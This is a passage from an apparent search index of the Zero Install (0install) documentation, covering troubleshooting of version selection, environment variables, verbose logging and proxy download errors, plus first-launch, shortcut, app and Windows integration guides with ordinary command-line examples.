yourself, let the upstream maintainers do most of the work for you. They'll create packages, test them, provide updates and deal with bug reports. Unless you actually want to change something, you don't need to do anything. Dependencies are resolved on a per-program basis. If two programs can use the same version of a library then that's great; they'll share it. If not, then two copies of the library will co-exist. This is all automatic. How do I ... ... override a package's default configuration? Put your defaults in /etc as normal and the package should pick them up (though it depends on the program, of course). ... override a dependency of a Zero Install package to use my custom packaged library? You can register an additional feed in /usr/share/0install.net . See Distribution Integration for details. ... suggest suitable Zero Install packages for my users? See the instructions for administrators above. You just provide launchers. Each program will get installed when the first user runs it. ... sign off upstream versions I've tested? This is not yet supported. Talk to us! In general, we welcome better integration with distributions, so write to our mailing list and we'll work something out!","title":"Distribution maintainer"},{"location":"troubleshooting/","text":"0install is not running the latest version of a program 0install doesn't select any versions / the expected versions Why is this environment variable set? Verbose logging Download problems / proxies / HTTP errors Other problems 0install is not running the latest version of a program Try executing the same command again but with the --refresh option. For example: $ 0install run --refresh http://repo.roscidus.com/utils/vlc 0install doesn't select any versions / the expected versions If 0install cannot find a compatible set of versions for a program, you may see an error like this: Or, if not using the GUI, like this: Can't find all required implementations: - http://repo.roscidus.com/java/swt -> (problem) http://www.serscis.eu/0install/serscis-access-modeller 0.15.1 requires 3.7 <= version - http://repo.roscidus.com/utils/graphviz -> 2.28.0-3.2.3 (package:rpm:graphviz:2.28.0-3.2.3:i586) - http://repo.roscidus.com/java/openjdk-jre -> 6.18-1.8.7-2 (sha1new=6b7c9f98bd1d8bec5bbb5ddb41271c862c8e8529) - http://repo.roscidus.com/java/iris -> 0.6.0 (sha1new=daf7bfada93ec758baeef1c714f3239ce0a5a462) - http://www.serscis.eu/0install/serscis-access-modeller -> 0.15.1 (sha1new=7899dbe75c1c332c4e70f272b2d76026714392a6) User requested 0.10 <= version To find the cause, start by double-clicking on \"(problem)\" in the GUI to get the list of available versions for that component. Right-click over the version you think it should have chosen and choose \"Explain this decision\" from the menu: In this example, the user requested serscis-access-modeller >= 0.10 and all such versions needed SWT >= 3.7 so there was no possible selection (note: this conflict was invented for the sake of this tutorial). The line \"User requested implementation ...\" shows the version which was selected from the list; the solver was constrained to choose this version. There are several common causes: There is no binary for your platform (e.g. you are using 32-bit Windows, but there are only binaries for 64-bit Linux). In this case, you can use 0install to compile a new binary from source (if source is provided in the feed). See 0compile for details. If no source is provided, you will need to go to the project's web-site and compile manually. The dependency is only provided by distribution packages, and your distribution isn't listed Have a look at the feed's XML (View Page Source in your browser) to see if your distribution package is listed. See Distribution Integration for details. Sometimes, the failure to select a version is due to complex inter-dependencies between components. If a valid set of versions exists, 0install will always find it, but if no valid set exists then it can be hard for it to explain why. Rather that showing a proof that none of the billions of possible combinations is valid, 0install tries to find the best example of a failed selection to show you. It works like this: When the solve fails, 0install switches to debug mode and runs the solve again. Debug mode adds a fake implementation of each component. This fake version is fully compatible with everything, but less preferable than all the real versions (so it will only be selected if there is no other option). This always results in a \"solution\", but whenever a fake implementation is selected it is reported as \"(problem)\", as shown above. This is quite good at suggesting where the fault is, but the problem may be elsewhere. For example, if a program has versions available for Python 3 and Python 2, and you only have Python 2, then 0install should select the Python 2 version. But if it can't find any valid selections (because some other library required for the Python 2 version is missing), then it might report that the lack of Python 3 is the issue (when, in fact, that's just one possible way of fixing the problem). To investigate further, you can use the --version-for option to fix the versions of multiple components. For example, to find out why you can't run 0compile 1.1 with 0publish 0.20 and 0install 2.1: $ 0install select -c http://0install.net/2006/interfaces/0compile.xml --version 1.1 \\ --version-for http://0install.net/2006/interfaces/0publish 0.20 \\ --version-for http://0install.net/2007/interfaces/ZeroInstall.xml 2.1 Can't find all required implementations: - http://0install.net/2006/interfaces/0compile.xml -> 1.1 (sha1new=5d11d6a774f261b408f3c57dce8819481d842f90) User requested version 1.1 - http://0install.net/2006/interfaces/0publish -> 0.20 (sha1new=3a62c59321720a1736899dec9ef7deb0b29b7b43) User requested version 0.20 - http://0install.net/2007/interfaces/ZeroInstall.xml -> (problem) http://0install.net/2006/interfaces/0compile.xml 1.1 requires 2.1 <= version http://0install.net/2006/interfaces/0publish 0.20 requires version < 1.11-post User requested version 2.1 No usable implementations satisfy the restrictions: /home/tal/Projects/zero-install/0install (2.1-post): Incompatible with user-specified requirements sha1new=4f860b217bb94723ad6af9062d25dc7faee6a7ae (2.1): incompatible with restrictions sha1new=3fa607f49966f7eb00682336a4391c78d13a3d8b (2.0): Incompatible with user-specified requirements sha1new=cc7a0dcf44d42714bcf1efd27e8ec1f1810ce7da (1.16): Incompatible with user-specified requirements sha1new=ab6ca6165cd57a1bb95ddf5af9c51cdf325e1db8 (1.15): Incompatible with user-specified requirements ... - http://repo.roscidus.com/python/python -> 2.7.3-4 (package:arch:python2:2.7.3-4:x86_64) Here, we can see that 0publish 0.20 requires an old version of 0install, while 0compile 1.1 requires a newer one. Why is this environment variable set? When you run a program, each component (library) can ask for certain environment variables to be set (this only affects the program being run, not all programs). If variables are being set incorrectly, you'll need to track down why. e.g. $ sam Picked up _JAVA_OPTIONS: -XstartOnFirstThread Unrecognized option: -XstartOnFirstThread Could not create the Java virtual machine. To debug this, ask 0install to output the selections as XML and look for the setting inside it. xmllint is useful to format the XML nicely: $ 0install select --xml sam | xmllint --format - > selections.xml (if sam is an old-style alias rather than an app, use alias:sam instead) In this case, we find the selections.xml document contains: <selection arch=\"MacOSX-x86_64\" version=\"3.6.1\" interface=\"http://repo.roscidus.com/java/swt\" ...> ... <environment mode=\"prepend\" name=\"_JAVA_OPTIONS\" separator=\" \" value=\"-XstartOnFirstThread\"/> </selection> This tells us that the OS X implementation of version 3.6.1 of the SWT library requested this setting. To test whether this is the problem, remove the <environment> element and try running it: $ 0install run selections.xml Having identified the problem, you can now file a bug report against the SWT feed. Verbose logging If 0install isn't doing what you expect, run it with logging turned up using either -v (verbose) or -vv (very verbose!). Use -c to prevent it switching to GUI mode too. Eg: $ 0install run -vvc http://rox.sourceforge.net/2005/interfaces/Edit INFO:root:Running 0install 1.12 ['http://rox.sourceforge.net/2005/interfaces/Edit']; Python 2.7.3 (default, Aug 26 2012, 11:57:48) [GCC 4.7.1] INFO:0install:Loading configuration from /home/me/.config/0install.net/injector/global DEBUG:0install:Loading cached information for http://rox.sourceforge.net/2005/interfaces/Edit from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit INFO:0install:Note: @main on document element is deprecated in <Feed http://rox.sourceforge.net/2005/interfaces/Edit> DEBUG:0install:Supported systems: '{None: 3, 'POSIX': 2, 'Linux': 1}' DEBUG:0install:Supported processors: '{'x86_64': 0, 'i586': 2, 'i486': 3, 'i686': 1, 'i386': 4, None: 5}' DEBUG:0install:Initialising new interface object for http://rox.sourceforge.net/2005/interfaces/Edit DEBUG:0install:Loading cached information for http://rox.sourceforge.net/2005/interfaces/Edit from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit INFO:0install:Note: @main on document element is deprecated in <Feed http://rox.sourceforge.net/2005/interfaces/Edit> DEBUG:0install:Processing feed http://rox.sourceforge.net/2005/interfaces/Edit DEBUG:0install:Location of 'implementation-dirs' config file being used: 'None' DEBUG:0install:Added system store '/var/cache/0install.net/implementations' DEBUG:0install:Initialising new interface object for http://rox.sourceforge.net/2005/interfaces/ROX-Lib DEBUG:0install:Loading cached information for http://rox.sourceforge.net/2005/interfaces/ROX-Lib from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fROX-Lib INFO:0install:Note: @main on document element is deprecated in <Feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib> DEBUG:0install:Processing feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib DEBUG:0install:Initialising new interface object for http://repo.roscidus.com/python/python DEBUG:0install:Loading cached information for http://repo.roscidus.com/python/python from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frepo.roscidus.com%2fpython%2fpython DEBUG:0install:Processing feed http://repo.roscidus.com/python/python DEBUG:0install:Skipping '<Feed from http://0install.de/feeds/Python.xml>'; unsupported architecture Windows-None DEBUG:0install:Processing feed http://repo.roscidus.com/python/python/upstream.xml DEBUG:0install:Loading cached information for http://repo.roscidus.com/python/python/upstream.xml from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frepo.roscidus.com%2fpython%2fpython%2fupstream.xml DEBUG:0install:Is feed-for http://repo.roscidus.com/python/python DEBUG:0install:Staleness for <Feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib> is 273.80 hours DEBUG:0install:Staleness for <Feed http://repo.roscidus.com/python/python> is 273.80 hours DEBUG:0install:Staleness for <Feed http://repo.roscidus.com/python/python/upstream.xml> is 273.80 hours DEBUG:0install:Staleness for <Feed http://rox.sourceforge.net/2005/interfaces/Edit> is 273.80 hours INFO:0install:PYTHONPATH=/var/cache/0install.net/implementations/sha256=ccefa7b1873926de15430341b912466929fbff8116b6d0ad67c4df6d0c06243e/ROX-Lib2/python INFO:0install:Executing: [u'/usr/bin/python2.7', u'/var/cache/0install.net/implementations/sha256=ba3b495324192bb6c3fc1a2d9af3db2ced997fc8ce3177f08c926bebafcf16b9/Edit/AppRun'] Windows only: If you encountered an error and did not use -v , used the GUI or forgot to copy the console output you can still find the relevant information in log files stored in the %TEMP% directory. Look for files named 0install GUI USERNAME Log.txt or Zero Install Command WinForms GUI USERNAME Log.txt (the specific name depends on the EXE you used to access Zero Install and your user account name). Download problems / proxies / HTTP errors If you get download errors, try fetching the failing URL using wget, e.g.: $ 0install run http://... Error downloading 'http://osdn.dl.sourceforge.net/sourceforge/zero-install/injector-gui-0.16.tgz': HTTP Error 403: Forbidden: header 'Content-Type' value denied $ wget http://... If wget also fails, try opening the URL in your web browser. If one of these works, but 0install doesn't, it may be that you are using an HTTP proxy. Your web browser is configured to use it, but your http_proxy environment variable is not set. Check your browser configuration and ensure that http_proxy is set correctly, e.g.: $ export http_proxy=http://myproxy.server:444 $ 0install run http://... Other problems If you still have problems, please write to the mailing list , and send the output of the commands above.","title":"Trouble-shooting"},{"location":"troubleshooting/#0install-is-not-running-the-latest-version-of-a-program","text":"Try executing the same command again but with the --refresh option. For example: $ 0install run --refresh http://repo.roscidus.com/utils/vlc","title":"0install is not running the latest version of a program"},{"location":"troubleshooting/#0install-doesnt-select-any-versions-the-expected-versions","text":"If 0install cannot find a compatible set of versions for a program, you may see an error like this: Or, if not using the GUI, like this: Can't find all required implementations: - http://repo.roscidus.com/java/swt -> (problem) http://www.serscis.eu/0install/serscis-access-modeller 0.15.1 requires 3.7 <= version - http://repo.roscidus.com/utils/graphviz -> 2.28.0-3.2.3 (package:rpm:graphviz:2.28.0-3.2.3:i586) - http://repo.roscidus.com/java/openjdk-jre -> 6.18-1.8.7-2 (sha1new=6b7c9f98bd1d8bec5bbb5ddb41271c862c8e8529) - http://repo.roscidus.com/java/iris -> 0.6.0 (sha1new=daf7bfada93ec758baeef1c714f3239ce0a5a462) - http://www.serscis.eu/0install/serscis-access-modeller -> 0.15.1 (sha1new=7899dbe75c1c332c4e70f272b2d76026714392a6) User requested 0.10 <= version To find the cause, start by double-clicking on \"(problem)\" in the GUI to get the list of available versions for that component. Right-click over the version you think it should have chosen and choose \"Explain this decision\" from the menu: In this example, the user requested serscis-access-modeller >= 0.10 and all such versions needed SWT >= 3.7 so there was no possible selection (note: this conflict was invented for the sake of this tutorial). The line \"User requested implementation ...\" shows the version which was selected from the list; the solver was constrained to choose this version. There are several common causes: There is no binary for your platform (e.g. you are using 32-bit Windows, but there are only binaries for 64-bit Linux). In this case, you can use 0install to compile a new binary from source (if source is provided in the feed). See 0compile for details. If no source is provided, you will need to go to the project's web-site and compile manually. The dependency is only provided by distribution packages, and your distribution isn't listed Have a look at the feed's XML (View Page Source in your browser) to see if your distribution package is listed. See Distribution Integration for details. Sometimes, the failure to select a version is due to complex inter-dependencies between components. If a valid set of versions exists, 0install will always find it, but if no valid set exists then it can be hard for it to explain why. Rather that showing a proof that none of the billions of possible combinations is valid, 0install tries to find the best example of a failed selection to show you. It works like this: When the solve fails, 0install switches to debug mode and runs the solve again. Debug mode adds a fake implementation of each component. This fake version is fully compatible with everything, but less preferable than all the real versions (so it will only be selected if there is no other option). This always results in a \"solution\", but whenever a fake implementation is selected it is reported as \"(problem)\", as shown above. This is quite good at suggesting where the fault is, but the problem may be elsewhere. For example, if a program has versions available for Python 3 and Python 2, and you only have Python 2, then 0install should select the Python 2 version. But if it can't find any valid selections (because some other library required for the Python 2 version is missing), then it might report that the lack of Python 3 is the issue (when, in fact, that's just one possible way of fixing the problem). To investigate further, you can use the --version-for option to fix the versions of multiple components. For example, to find out why you can't run 0compile 1.1 with 0publish 0.20 and 0install 2.1: $ 0install select -c http://0install.net/2006/interfaces/0compile.xml --version 1.1 \\ --version-for http://0install.net/2006/interfaces/0publish 0.20 \\ --version-for http://0install.net/2007/interfaces/ZeroInstall.xml 2.1 Can't find all required implementations: - http://0install.net/2006/interfaces/0compile.xml -> 1.1 (sha1new=5d11d6a774f261b408f3c57dce8819481d842f90) User requested version 1.1 - http://0install.net/2006/interfaces/0publish -> 0.20 (sha1new=3a62c59321720a1736899dec9ef7deb0b29b7b43) User requested version 0.20 - http://0install.net/2007/interfaces/ZeroInstall.xml -> (problem) http://0install.net/2006/interfaces/0compile.xml 1.1 requires 2.1 <= version http://0install.net/2006/interfaces/0publish 0.20 requires version < 1.11-post User requested version 2.1 No usable implementations satisfy the restrictions: /home/tal/Projects/zero-install/0install (2.1-post): Incompatible with user-specified requirements sha1new=4f860b217bb94723ad6af9062d25dc7faee6a7ae (2.1): incompatible with restrictions sha1new=3fa607f49966f7eb00682336a4391c78d13a3d8b (2.0): Incompatible with user-specified requirements sha1new=cc7a0dcf44d42714bcf1efd27e8ec1f1810ce7da (1.16): Incompatible with user-specified requirements sha1new=ab6ca6165cd57a1bb95ddf5af9c51cdf325e1db8 (1.15): Incompatible with user-specified requirements ... - http://repo.roscidus.com/python/python -> 2.7.3-4 (package:arch:python2:2.7.3-4:x86_64) Here, we can see that 0publish 0.20 requires an old version of 0install, while 0compile 1.1 requires a newer one.","title":"0install doesn't select any versions / the expected versions"},{"location":"troubleshooting/#why-is-this-environment-variable-set","text":"When you run a program, each component (library) can ask for certain environment variables to be set (this only affects the program being run, not all programs). If variables are being set incorrectly, you'll need to track down why. e.g. $ sam Picked up _JAVA_OPTIONS: -XstartOnFirstThread Unrecognized option: -XstartOnFirstThread Could not create the Java virtual machine. To debug this, ask 0install to output the selections as XML and look for the setting inside it. xmllint is useful to format the XML nicely: $ 0install select --xml sam | xmllint --format - > selections.xml (if sam is an old-style alias rather than an app, use alias:sam instead) In this case, we find the selections.xml document contains: <selection arch=\"MacOSX-x86_64\" version=\"3.6.1\" interface=\"http://repo.roscidus.com/java/swt\" ...> ... <environment mode=\"prepend\" name=\"_JAVA_OPTIONS\" separator=\" \" value=\"-XstartOnFirstThread\"/> </selection> This tells us that the OS X implementation of version 3.6.1 of the SWT library requested this setting. To test whether this is the problem, remove the <environment> element and try running it: $ 0install run selections.xml Having identified the problem, you can now file a bug report against the SWT feed.","title":"Why is this environment variable set?"},{"location":"troubleshooting/#verbose-logging","text":"If 0install isn't doing what you expect, run it with logging turned up using either -v (verbose) or -vv (very verbose!). Use -c to prevent it switching to GUI mode too. Eg: $ 0install run -vvc http://rox.sourceforge.net/2005/interfaces/Edit INFO:root:Running 0install 1.12 ['http://rox.sourceforge.net/2005/interfaces/Edit']; Python 2.7.3 (default, Aug 26 2012, 11:57:48) [GCC 4.7.1] INFO:0install:Loading configuration from /home/me/.config/0install.net/injector/global DEBUG:0install:Loading cached information for http://rox.sourceforge.net/2005/interfaces/Edit from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit INFO:0install:Note: @main on document element is deprecated in <Feed http://rox.sourceforge.net/2005/interfaces/Edit> DEBUG:0install:Supported systems: '{None: 3, 'POSIX': 2, 'Linux': 1}' DEBUG:0install:Supported processors: '{'x86_64': 0, 'i586': 2, 'i486': 3, 'i686': 1, 'i386': 4, None: 5}' DEBUG:0install:Initialising new interface object for http://rox.sourceforge.net/2005/interfaces/Edit DEBUG:0install:Loading cached information for http://rox.sourceforge.net/2005/interfaces/Edit from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit INFO:0install:Note: @main on document element is deprecated in <Feed http://rox.sourceforge.net/2005/interfaces/Edit> DEBUG:0install:Processing feed http://rox.sourceforge.net/2005/interfaces/Edit DEBUG:0install:Location of 'implementation-dirs' config file being used: 'None' DEBUG:0install:Added system store '/var/cache/0install.net/implementations' DEBUG:0install:Initialising new interface object for http://rox.sourceforge.net/2005/interfaces/ROX-Lib DEBUG:0install:Loading cached information for http://rox.sourceforge.net/2005/interfaces/ROX-Lib from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fROX-Lib INFO:0install:Note: @main on document element is deprecated in <Feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib> DEBUG:0install:Processing feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib DEBUG:0install:Initialising new interface object for http://repo.roscidus.com/python/python DEBUG:0install:Loading cached information for http://repo.roscidus.com/python/python from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frepo.roscidus.com%2fpython%2fpython DEBUG:0install:Processing feed http://repo.roscidus.com/python/python DEBUG:0install:Skipping '<Feed from http://0install.de/feeds/Python.xml>'; unsupported architecture Windows-None DEBUG:0install:Processing feed http://repo.roscidus.com/python/python/upstream.xml DEBUG:0install:Loading cached information for http://repo.roscidus.com/python/python/upstream.xml from /home/me/.cache/0install.net/interfaces/http%3a%2f%2frepo.roscidus.com%2fpython%2fpython%2fupstream.xml DEBUG:0install:Is feed-for http://repo.roscidus.com/python/python DEBUG:0install:Staleness for <Feed http://rox.sourceforge.net/2005/interfaces/ROX-Lib> is 273.80 hours DEBUG:0install:Staleness for <Feed http://repo.roscidus.com/python/python> is 273.80 hours DEBUG:0install:Staleness for <Feed http://repo.roscidus.com/python/python/upstream.xml> is 273.80 hours DEBUG:0install:Staleness for <Feed http://rox.sourceforge.net/2005/interfaces/Edit> is 273.80 hours INFO:0install:PYTHONPATH=/var/cache/0install.net/implementations/sha256=ccefa7b1873926de15430341b912466929fbff8116b6d0ad67c4df6d0c06243e/ROX-Lib2/python INFO:0install:Executing: [u'/usr/bin/python2.7', u'/var/cache/0install.net/implementations/sha256=ba3b495324192bb6c3fc1a2d9af3db2ced997fc8ce3177f08c926bebafcf16b9/Edit/AppRun'] Windows only: If you encountered an error and did not use -v , used the GUI or forgot to copy the console output you can still find the relevant information in log files stored in the %TEMP% directory. Look for files named 0install GUI USERNAME Log.txt or Zero Install Command WinForms GUI USERNAME Log.txt (the specific name depends on the EXE you used to access Zero Install and your user account name).","title":"Verbose logging"},{"location":"troubleshooting/#download-problems-proxies-http-errors","text":"If you get download errors, try fetching the failing URL using wget, e.g.: $ 0install run http://... Error downloading 'http://osdn.dl.sourceforge.net/sourceforge/zero-install/injector-gui-0.16.tgz': HTTP Error 403: Forbidden: header 'Content-Type' value denied $ wget http://... If wget also fails, try opening the URL in your web browser. If one of these works, but 0install doesn't, it may be that you are using an HTTP proxy. Your web browser is configured to use it, but your http_proxy environment variable is not set. Check your browser configuration and ensure that http_proxy is set correctly, e.g.: $ export http_proxy=http://myproxy.server:444 $ 0install run http://...","title":"Download problems / proxies / HTTP errors"},{"location":"troubleshooting/#other-problems","text":"If you still have problems, please write to the mailing list , and send the output of the commands above.","title":"Other problems"},{"location":"basics/","text":"Introduction A 0install application is distributed using a feed file . A feed is an XML file that tells 0install how to run the application, and which versions are available. The feed file is normally published on the web; the URL of the feed is the unique identifier of the application. For example, OpenTTD is available via 0install, it has this feed file and it is uniquely identified as http://repo.roscidus.com/games/openttd . To get a 0install application: 1. Find a program you want to run on the web: 2. Either launch it directly: $ 0install run http://repo.roscidus.com/games/openttd Or generate a shortcut to launch it later: Upon first launch of a feed, 0install may ask you to accept keys and be allowed to download files.","title":"Introduction"},{"location":"basics/#introduction","text":"A 0install application is distributed using a feed file . A feed is an XML file that tells 0install how to run the application, and which versions are available. The feed file is normally published on the web; the URL of the feed is the unique identifier of the application. For example, OpenTTD is available via 0install, it has this feed file and it is uniquely identified as http://repo.roscidus.com/games/openttd . To get a 0install application: 1. Find a program you want to run on the web: 2. Either launch it directly: $ 0install run http://repo.roscidus.com/games/openttd Or generate a shortcut to launch it later: Upon first launch of a feed, 0install may ask you to accept keys and be allowed to download files.","title":"Introduction"},{"location":"basics/first-launch/","text":"When launching a feed for the first time, 0install will download the necessary files for you and store them in the cache . Next time, 0install will use these stored files, so you don't need to download the program again. From time to time 0install will check for updates and offer to download them. Linux example Windows example Linux example $ 0install run http://repo.roscidus.com/games/openttd 1. Click Download The downloaded file says that OpenTTD requires various libraries (Freetype2, SDL, libgcc1, etc). Each library is identified by a web address (URL) in the same way that the main OpenTTD program was. 0install downloads information about them in the same way and selects a compatible set of versions. The window displays a dialog box showing the program and all required libraries. Click Download . 2. Wait for the download to finish 0install now downloads all the required archives (supported formats include tar.gz, tar.bz2, zip, rpm and deb). It unpacks each one into its own directory and checks its contents against the cryptographic digest given in the (signed) feed file. If the archive has been changed since the feed was signed, the download will be rejected. If the archive hasn't been tampered with, it is stored in a cache directory (see sharing for more information) in its own subdirectory, named after the digest. This ensures that no two downloads can conflict with each other. Windows example 1. Pick an application Launch Zero Install and choose an application in the Catalog, e.g., PDF Split and Merge. Click Run . 2. Wait for the download to finish Zero Install now downloads application as well as dependencies needed to run it, e.g., PDF Split and Merge and the Java Runtime. It unpacks each into its own directory and checks its contents against the cryptographic digest given in the (signed) feed file. If the archive has been changed since the feed was signed, the download will be rejected. If the archive hasn't been tampered with, it is stored in a cache directory in its own subdirectory, named after the digest. This ensures that no two downloads can conflict with each other. You can also use the command-line to launch applications with 0install: > 0install run http://repo.roscidus.com/python/python Downloading http://repo.roscidus.com/python/python... [====================] Complete Downloading http://repo.roscidus.com/python/python/upstream.xml... [====================] Complete Downloading http://repo.roscidus.com/python/python-win32... [====================] Complete Downloading https://www.python.org/ftp/python/3.7.3/python-3.7.3-embed-amd64.zip... [====================] Complete Extracting archive... [====================] Complete Generating sha256new manifest... [====================] Complete Python 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 22:22:05) [MSC v.1916 64 bit (AMD64)] on win32 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>>","title":"First launch"},{"location":"basics/first-launch/#linux-example","text":"$ 0install run http://repo.roscidus.com/games/openttd 1. Click Download The downloaded file says that OpenTTD requires various libraries (Freetype2, SDL, libgcc1, etc). Each library is identified by a web address (URL) in the same way that the main OpenTTD program was. 0install downloads information about them in the same way and selects a compatible set of versions. The window displays a dialog box showing the program and all required libraries. Click Download . 2. Wait for the download to finish 0install now downloads all the required archives (supported formats include tar.gz, tar.bz2, zip, rpm and deb). It unpacks each one into its own directory and checks its contents against the cryptographic digest given in the (signed) feed file. If the archive has been changed since the feed was signed, the download will be rejected. If the archive hasn't been tampered with, it is stored in a cache directory (see sharing for more information) in its own subdirectory, named after the digest. This ensures that no two downloads can conflict with each other.","title":"Linux example"},{"location":"basics/first-launch/#windows-example","text":"1. Pick an application Launch Zero Install and choose an application in the Catalog, e.g., PDF Split and Merge. Click Run . 2. Wait for the download to finish Zero Install now downloads application as well as dependencies needed to run it, e.g., PDF Split and Merge and the Java Runtime. It unpacks each into its own directory and checks its contents against the cryptographic digest given in the (signed) feed file. If the archive has been changed since the feed was signed, the download will be rejected. If the archive hasn't been tampered with, it is stored in a cache directory in its own subdirectory, named after the digest. This ensures that no two downloads can conflict with each other. You can also use the command-line to launch applications with 0install: > 0install run http://repo.roscidus.com/python/python Downloading http://repo.roscidus.com/python/python... [====================] Complete Downloading http://repo.roscidus.com/python/python/upstream.xml... [====================] Complete Downloading http://repo.roscidus.com/python/python-win32... [====================] Complete Downloading https://www.python.org/ftp/python/3.7.3/python-3.7.3-embed-amd64.zip... [====================] Complete Extracting archive... [====================] Complete Generating sha256new manifest... [====================] Complete Python 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 22:22:05) [MSC v.1916 64 bit (AMD64)] on win32 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>>","title":"Windows example"},{"location":"basics/making-shortcuts/","text":"Shortcuts provide an easy way to run a program without entering the full URI, just like a bookmark in a web-browser provides an easy way to return to a web page without entering the full URL. Different environments provide different ways to add shortcuts: GNOME KDE ROX Finder Windows Shell GNOME Choose Zero Install -> Add New Program from the Applications menu. Type in the URI, or drag it from the web-browser into the dialog box. Ubuntu users : You need to open and then close the menu editor after adding a program before it will show up; see Ubuntu bug #191958 . You can also run programs directly by choosing Manage Programs from the menu. KDE Choose Add Zero Install Program from the Utilities menu. Type in the URI, or drag it from the web-browser into the dialog box. ROX Drag the link from your web-browser to the AddApp program, then drag the launcher from there to wherever you want it. AddApp 's page has more details. Finder Copy the link from your web-browser to the AddApp program, then save the launcher from there to wherever you want it. Windows See Desktop integration for details. Shell The 0install add command can be used to create little shell scripts to start programs easily: $ 0install add rox-edit http://rox.sourceforge.net/2005/interfaces/Edit The command puts the script in the first writable directory in your $PATH . You can now run Edit like this: $ rox-edit","title":"Making shortcuts"},{"location":"basics/making-shortcuts/#gnome","text":"Choose Zero Install -> Add New Program from the Applications menu. Type in the URI, or drag it from the web-browser into the dialog box. Ubuntu users : You need to open and then close the menu editor after adding a program before it will show up; see Ubuntu bug #191958 . You can also run programs directly by choosing Manage Programs from the menu.","title":"GNOME"},{"location":"basics/making-shortcuts/#kde","text":"Choose Add Zero Install Program from the Utilities menu. Type in the URI, or drag it from the web-browser into the dialog box.","title":"KDE"},{"location":"basics/making-shortcuts/#rox","text":"Drag the link from your web-browser to the AddApp program, then drag the launcher from there to wherever you want it. AddApp 's page has more details.","title":"ROX"},{"location":"basics/making-shortcuts/#finder","text":"Copy the link from your web-browser to the AddApp program, then save the launcher from there to wherever you want it.","title":"Finder"},{"location":"basics/making-shortcuts/#windows","text":"See Desktop integration for details.","title":"Windows"},{"location":"basics/making-shortcuts/#shell","text":"The 0install add command can be used to create little shell scripts to start programs easily: $ 0install add rox-edit http://rox.sourceforge.net/2005/interfaces/Edit The command puts the script in the first writable directory in your $PATH . You can now run Edit like this: $ rox-edit","title":"Shell"},{"location":"basics/using-apps/","text":"Using apps Note: This is currently not supported in Zero Install for Windows. Please see Desktop integration for a functionally similar replacement. Apps (introduced in 0install 1.9) work a bit like aliases, e.g. $ 0install add rox http://rox.sourceforge.net/2005/interfaces/ROX-Filer $ rox --version ROX-Filer 2.11 The main difference is that apps store their current selections (in ~/.config/0install.net/apps/rox/selections.xml in this case). This means that they start faster, because the solver isn't needed: $ 0alias rox-alias http://rox.sourceforge.net/2005/interfaces/ROX-Filer $ 0install add rox-app http://rox.sourceforge.net/2005/interfaces/ROX-Filer $ time rox-alias --version > /dev/null rox-alias --version > /dev/null 0.12s user 0.02s system 91% cpu 0.144 total $ time rox-app --version > /dev/null rox-app --version > /dev/null 0.06s user 0.02s system 92% cpu 0.082 total When run, they still trigger a background update if they haven't been updated for a while, and you can also update them manually: $ 0install update rox No updates found. Continuing with version 2.11. They also remember any restrictions (e.g. --before). Each app also stores past selections (max one set per day) so if an update goes wrong you can see what changed and roll-back easily: $ 0install whatchanged 0publish Last checked : Wed Jun 27 20:24:19 2012 Last update : 2012-06-27 Previous update : 2012-06-16 http://0install.net/2007/interfaces/ZeroInstall.xml: 1.8-post -> 1.9-post http://repo.roscidus.com/security/gnupg: new -> 1.4.12-4 To run using the previous selections, use: $ 0install run /home/tal/.config/0install.net/apps/0publish/selections-2012-06-16.xml Starting with 0install 1.14, 0alias is deprecated, and trying to add an alias will add an app instead.","title":"Using apps"},{"location":"basics/using-apps/#using-apps","text":"Note: This is currently not supported in Zero Install for Windows. Please see Desktop integration for a functionally similar replacement. Apps (introduced in 0install 1.9) work a bit like aliases, e.g. $ 0install add rox http://rox.sourceforge.net/2005/interfaces/ROX-Filer $ rox --version ROX-Filer 2.11 The main difference is that apps store their current selections (in ~/.config/0install.net/apps/rox/selections.xml in this case). This means that they start faster, because the solver isn't needed: $ 0alias rox-alias http://rox.sourceforge.net/2005/interfaces/ROX-Filer $ 0install add rox-app http://rox.sourceforge.net/2005/interfaces/ROX-Filer $ time rox-alias --version > /dev/null rox-alias --version > /dev/null 0.12s user 0.02s system 91% cpu 0.144 total $ time rox-app --version > /dev/null rox-app --version > /dev/null 0.06s user 0.02s system 92% cpu 0.082 total When run, they still trigger a background update if they haven't been updated for a while, and you can also update them manually: $ 0install update rox No updates found. Continuing with version 2.11. They also remember any restrictions (e.g. --before). Each app also stores past selections (max one set per day) so if an update goes wrong you can see what changed and roll-back easily: $ 0install whatchanged 0publish Last checked : Wed Jun 27 20:24:19 2012 Last update : 2012-06-27 Previous update : 2012-06-16 http://0install.net/2007/interfaces/ZeroInstall.xml: 1.8-post -> 1.9-post http://repo.roscidus.com/security/gnupg: new -> 1.4.12-4 To run using the previous selections, use: $ 0install run /home/tal/.config/0install.net/apps/0publish/selections-2012-06-16.xml Starting with 0install 1.14, 0alias is deprecated, and trying to add an alias will add an app instead.","title":"Using apps"},{"location":"basics/windows/","text":"Note: This is currently only supported in Zero Install for Windows . Zero Install allows you to integrate applications into your desktop environment as you are accustomed to from classic setup programs: Start menu entries, file type associations, entries in context menus, etc.. All the advantages of Zero Install such as automatic updates, parallel usage of multiple application versions and easy application removal are preserved. Basics Advanced Machine-wide Basics Open Zero Install and search for an app in the \"Catalog\" and click Run . If you like the 